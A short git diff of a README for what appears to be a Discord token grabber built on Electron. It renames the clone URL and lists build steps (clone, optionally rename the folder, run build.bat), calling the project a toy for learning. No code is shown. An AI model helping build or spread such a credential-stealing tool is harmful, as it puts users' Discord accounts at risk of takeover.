@@ -7,7 +7,7 @@ This is just a toy project. Something for me to mess around with so I can learn 
 For fun, and as a way fun/interesting way to learn more about Electron and Discord.
 
 ## How to get it working
-- Run `git clone https://github.com/spinfal/discord-token-grabber.git`
+- Run `git clone https://github.com/spinfal/electron-token-grabber.git`
 - (optional) Rename the folder to change the Electron app name. **Do NOT set the folder name to `discord`. That will mess up your actual Discord installation and you will need to reinstall Discord.**
 - Run `build.bat`
 - Answer provided prompts
